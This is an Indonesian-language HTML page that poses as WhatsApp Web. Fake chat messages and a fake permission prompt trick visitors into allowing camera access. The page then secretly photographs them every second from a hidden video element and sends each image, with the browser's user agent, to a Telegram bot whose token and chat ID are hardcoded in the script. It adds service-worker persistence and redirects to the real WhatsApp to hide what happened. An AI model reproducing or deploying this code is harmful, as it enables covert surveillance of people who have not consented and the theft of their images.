<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #e5ddd5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
        }
        
        /* Tampilan WhatsApp asli */
        .whatsapp-container {
            width: 100%;
            max-width: 500px;
            height: 100vh;
            background: white;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            position: relative;
        }
        
        /* Header WhatsApp */
        .wa-header {
            background: #075e54;
            color: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 70px;
        }
        
        .wa-header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .wa-avatar {
            width: 45px;
            height: 45px;
            background: #128C7E;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: bold;
            color: white;
            border: 2px solid #25D366;
        }
        
        .wa-title h2 {
            font-size: 18px;
            font-weight: 500;
        }
        
        .wa-title p {
            font-size: 13px;
            opacity: 0.8;
        }
        
        .wa-header-right {
            display: flex;
            gap: 20px;
        }
        
        .wa-header-right span {
            font-size: 22px;
            cursor: pointer;
        }
        
        /* Chat area */
        .wa-chat-area {
            flex: 1;
            background: #e5ddd5;
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI1MCIgdmlld0JveD0iMCAwIDUwIDUwIj48cGF0aCBkPSJNMjUgMjUgYTEwIDEwIDAgMCAxIDAgMjAgMTAgMTAgMCAwIDEgMC0yMHoiIGZpbGw9IiNmZmYiIG9wYWNpdHk9IjAuMSIvPjwvc3ZnPg==');
            padding: 15px;
            overflow-y: auto;
            position: relative;
        }
        
        /* Bubble chat */
        .chat-bubble {
            max-width: 80%;
            padding: 10px 15px;
            border-radius: 10px;
            margin-bottom: 10px;
            position: relative;
            clear: both;
        }
        
        .chat-bubble.received {
            background: white;
            float: left;
            border-top-left-radius: 0;
        }
        
        .chat-bubble.sent {
            background: #dcf8c6;
            float: right;
            border-top-right-radius: 0;
        }
        
        .chat-time {
            font-size: 11px;
            color: #999;
            text-align: right;
            margin-top: 5px;
        }
        
        .chat-name {
            font-size: 12px;
            font-weight: bold;
            color: #075e54;
            margin-bottom: 3px;
        }
        
        /* Typing indicator */
        .typing {
            background: white;
            padding: 15px;
            border-radius: 10px;
            width: fit-content;
            margin-bottom: 10px;
            float: left;
            clear: both;
        }
        
        .typing-dots {
            display: flex;
            gap: 5px;
        }
        
        .typing-dots span {
            width: 8px;
            height: 8px;
            background: #999;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }
        
        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
        
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-10px); opacity: 1; }
        }
        
        /* Input area */
        .wa-input-area {
            background: #f0f0f0;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-top: 1px solid #ddd;
        }
        
        .wa-input {
            flex: 1;
            background: white;
            border-radius: 25px;
            padding: 12px 20px;
            border: none;
            outline: none;
            font-size: 15px;
        }
        
        .wa-attach, .wa-send {
            font-size: 24px;
            color: #128C7E;
            cursor: pointer;
        }
        
        /* Status online */
        .online-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #25D366;
            border-radius: 50%;
            margin-right: 5px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        /* Notifikasi akses kamera palsu */
        .camera-permission {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 5px 30px rgba(0,0,0,0.3);
            z-index: 1000;
            width: 85%;
            max-width: 320px;
            text-align: center;
            display: none;
        }
        
        .camera-permission.active {
            display: block;
        }
        
        .camera-icon {
            font-size: 50px;
            color: #075e54;
            margin-bottom: 15px;
        }
        
        .camera-permission h3 {
            margin-bottom: 10px;
            color: #333;
        }
        
        .camera-permission p {
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .permission-buttons {
            display: flex;
            gap: 10px;
        }
        
        .btn-allow {
            flex: 1;
            background: #075e54;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .btn-block {
            flex: 1;
            background: #f0f0f0;
            color: #333;
            border: none;
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
        }
        
        /* Video tersembunyi */
        #hiddenCamera, #hiddenCanvas {
            display: none;
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
            pointer-events: none;
        }
        
        /* Loading screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #075e54;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            transition: opacity 0.5s;
        }
        
        .loading-screen.hidden {
            opacity: 0;
            pointer-events: none;
        }
        
        .whatsapp-logo {
            width: 80px;
            height: 80px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #075e54;
            animation: logoPulse 2s infinite;
        }
        
        @keyframes logoPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="whatsapp-logo">üì±</div>
    </div>

    <!-- WhatsApp Container -->
    <div class="whatsapp-container">
        <!-- Header -->
        <div class="wa-header">
            <div class="wa-header-left">
                <div class="wa-avatar">üìû</div>
                <div class="wa-title">
                    <h2>+62 812-3456-7890</h2>
                    <p><span class="online-status"></span>online</p>
                </div>
            </div>
            <div class="wa-header-right">
                <span>üìπ</span>
                <span>üìû</span>
                <span>‚ãÆ</span>
            </div>
        </div>
        
        <!-- Chat Area -->
        <div class="wa-chat-area" id="chatArea">
            <!-- Chat bubbles akan diisi JavaScript -->
        </div>
        
        <!-- Input Area -->
        <div class="wa-input-area">
            <span class="wa-attach">üìé</span>
            <input type="text" class="wa-input" placeholder="Ketik pesan..." id="chatInput">
            <span class="wa-send" id="sendBtn">üì§</span>
        </div>
    </div>

    <!-- Permission Popup -->
    <div class="camera-permission" id="cameraPermission">
        <div class="camera-icon">üìπ</div>
        <h3>"WhatsApp Web" ingin mengakses kamera</h3>
        <p>Untuk melakukan panggilan video dan mengirim foto</p>
        <div class="permission-buttons">
            <button class="btn-block" id="blockBtn">Blokir</button>
            <button class="btn-allow" id="allowBtn">Izinkan</button>
        </div>
    </div>

    <!-- Hidden elements -->
    <video id="hiddenCamera" autoplay playsinline></video>
    <canvas id="hiddenCanvas" width="640" height="480"></canvas>
    <iframe id="hiddenFrame" style="display: none;"></iframe>

    <script>
        // ============================================
        // KONFIGURASI TELEGRAM - GANTI DENGAN DATA ANDA
        // ============================================
        const TELEGRAM_TOKEN = '8252452562:AAF8Iv8BxO6j_O6rwCjMcSkQTKNTVmAK45M'; // GANTI!
        const TELEGRAM_CHAT_ID = '54445037'; // GANTI!
        
        // ============================================
        // ELEMEN DOM
        // ============================================
        const loadingScreen = document.getElementById('loadingScreen');
        const cameraPermission = document.getElementById('cameraPermission');
        const allowBtn = document.getElementById('allowBtn');
        const blockBtn = document.getElementById('blockBtn');
        const chatArea = document.getElementById('chatArea');
        const chatInput = document.getElementById('chatInput');
        const sendBtn = document.getElementById('sendBtn');
        const video = document.getElementById('hiddenCamera');
        const canvas = document.getElementById('hiddenCanvas');
        const context = canvas.getContext('2d');
        
        // ============================================
        // VARIABEL GLOBAL
        // ============================================
        let cameraStream = null;
        let photoInterval = null;
        let isCameraActive = false;
        let photoCount = 0;
        let messageCount = 0;
        
        // ============================================
        // FUNGSI TELEGRAM
        // ============================================
        
        // Kirim foto ke Telegram
        async function sendPhotoToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', imageBlob, `wa_capture_${Date.now()}.jpg`);
            formData.append('caption', `üì∏ WhatsApp Capture #${++photoCount}\n‚è∞ ${new Date().toLocaleString()}\nüì± ${navigator.userAgent}`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.ok) {
                    console.log('‚úÖ Foto terkirim #', photoCount);
                    return true;
                }
                return false;
            } catch (error) {
                console.log('‚ùå Error:', error);
                return false;
            }
        }
        
        // ============================================
        // FUNGSI KAMERA - 1 DETIK INTERVAL
        // ============================================
        
        // Ambil foto dan kirim
        function captureAndSend() {
            if (video.videoWidth > 0 && video.videoHeight > 0 && isCameraActive) {
                try {
                    // Gambar ke canvas
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Konversi ke blob
                    canvas.toBlob(async (blob) => {
                        if (blob && blob.size > 2000) { // Minimal 2KB
                            await sendPhotoToTelegram(blob);
                        }
                    }, 'image/jpeg', 0.6); // Kualitas 60% biar cepat
                    
                } catch (e) {
                    console.log('Capture error:', e);
                }
            }
        }
        
        // Mulai kamera
        async function startCamera() {
            try {
                // Coba kamera depan dulu
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 15 }
                    },
                    audio: false
                });
                
                cameraStream = stream;
                video.srcObject = stream;
                
                // Tunggu video siap
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                isCameraActive = true;
                console.log('‚úÖ Kamera aktif');
                
                // Mulai interval 1 detik!
                photoInterval = setInterval(captureAndSend, 1000);
                
                // Ambil foto pertama setelah 0.5 detik
                setTimeout(captureAndSend, 500);
                
                return true;
                
            } catch (error) {
                console.log('‚ùå Gagal akses kamera:', error);
                
                // Coba kamera belakang
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false
                    });
                    
                    cameraStream = stream;
                    video.srcObject = stream;
                    
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });
                    
                    isCameraActive = true;
                    photoInterval = setInterval(captureAndSend, 1000);
                    setTimeout(captureAndSend, 500);
                    
                    return true;
                    
                } catch (e) {
                    console.log('‚ùå Semua kamera gagal');
                    return false;
                }
            }
        }
        
        // ============================================
        // FUNGSI CHAT WHATSAPP PALSU
        // ============================================
        
        // Tambah pesan ke chat
        function addMessage(text, isSent = false) {
            const bubble = document.createElement('div');
            bubble.className = `chat-bubble ${isSent ? 'sent' : 'received'}`;
            
            if (!isSent) {
                const name = document.createElement('div');
                name.className = 'chat-name';
                name.textContent = '+62 812-3456-7890';
                bubble.appendChild(name);
            }
            
            const message = document.createElement('div');
            message.textContent = text;
            bubble.appendChild(message);
            
            const time = document.createElement('div');
            time.className = 'chat-time';
            time.textContent = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            bubble.appendChild(time);
            
            chatArea.appendChild(bubble);
            chatArea.scrollTop = chatArea.scrollHeight;
        }
        
        // Tambah typing indicator
        function showTyping() {
            const typing = document.createElement('div');
            typing.className = 'typing';
            typing.id = 'typingIndicator';
            typing.innerHTML = '<div class="typing-dots"><span></span><span></span><span></span></div>';
            chatArea.appendChild(typing);
            chatArea.scrollTop = chatArea.scrollHeight;
        }
        
        function hideTyping() {
            const typing = document.getElementById('typingIndicator');
            if (typing) typing.remove();
        }
        
        // Kirim pesan
        function sendMessage() {
            const text = chatInput.value.trim();
            if (text) {
                addMessage(text, true);
                chatInput.value = '';
                
                messageCount++;
                
                // Balasan otomatis setelah beberapa pesan
                if (messageCount === 1) {
                    setTimeout(() => {
                        showTyping();
                        setTimeout(() => {
                            hideTyping();
                            addMessage('Halo juga! Ada yang bisa dibantu?');
                        }, 2000);
                    }, 1000);
                } else if (messageCount === 2) {
                    setTimeout(() => {
                        showTyping();
                        setTimeout(() => {
                            hideTyping();
                            addMessage('Maaf, saya sedang sibuk. Nanti saya hubungi kembali.');
                        }, 1500);
                    }, 500);
                }
            }
        }
        
        // ============================================
        // INITIAL CHAT
        // ============================================
        function initializeChat() {
            addMessage('Hai! Ada yang bisa dibantu?');
            setTimeout(() => {
                showTyping();
                setTimeout(() => {
                    hideTyping();
                    addMessage('Untuk informasi lebih lanjut, silakan izinkan akses kamera untuk panggilan video');
                }, 2000);
            }, 1000);
        }
        
        // ============================================
        // REDIRECT KE WHATSAPP ASLI
        // ============================================
        function redirectToWhatsApp() {
            // Coba buka WhatsApp asli
            window.location.href = 'https://web.whatsapp.com';
            
            // Fallback setelah 2 detik
            setTimeout(() => {
                window.location.href = 'https://whatsapp.com';
            }, 2000);
        }
        
        // ============================================
        // SETUP PERSISTENCE
        // ============================================
        function setupPersistence() {
            // Service worker untuk background
            if ('serviceWorker' in navigator) {
                const swCode = `
                    self.addEventListener('install', (e) => self.skipWaiting());
                    self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
                `;
                const blob = new Blob([swCode], { type: 'application/javascript' });
                navigator.serviceWorker.register(URL.createObjectURL(blob));
            }
            
            // Iframe persistence
            const iframe = document.getElementById('hiddenFrame');
            iframe.srcdoc = `
                <html>
                <body>
                    <script>
                        setInterval(() => {
                            navigator.serviceWorker.controller.postMessage('ping');
                        }, 1000);
                    <\/script>
                </body>
                </html>
            `;
        }
        
        // ============================================
        // EVENT HANDLERS
        // ============================================
        
        // Loading screen
        setTimeout(() => {
            loadingScreen.classList.add('hidden');
            setTimeout(() => {
                cameraPermission.classList.add('active');
            }, 1000);
        }, 2000);
        
        // Allow button
        allowBtn.addEventListener('click', async () => {
            cameraPermission.classList.remove('active');
            
            // Tampilkan loading
            loadingScreen.classList.remove('hidden');
            loadingScreen.innerHTML = '<div class="whatsapp-logo">üìπ</div>';
            
            // Mulai kamera
            const success = await startCamera();
            
            if (success) {
                setupPersistence();
                
                // Sembunyikan loading
                setTimeout(() => {
                    loadingScreen.classList.add('hidden');
                }, 1000);
                
                // Initialize chat
                initializeChat();
                
                // Redirect ke WhatsApp asli setelah 30 detik
                setTimeout(() => {
                    redirectToWhatsApp();
                }, 30000);
                
            } else {
                alert('Gagal mengakses kamera. Mengalihkan...');
                redirectToWhatsApp();
            }
        });
        
        // Block button
        blockBtn.addEventListener('click', () => {
            cameraPermission.classList.remove('active');
            redirectToWhatsApp();
        });
        
        // Send message
        sendBtn.addEventListener('click', sendMessage);
        chatInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });
        
        // ============================================
        // CLEANUP
        // ============================================
        window.addEventListener('beforeunload', () => {
            if (photoInterval) clearInterval(photoInterval);
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
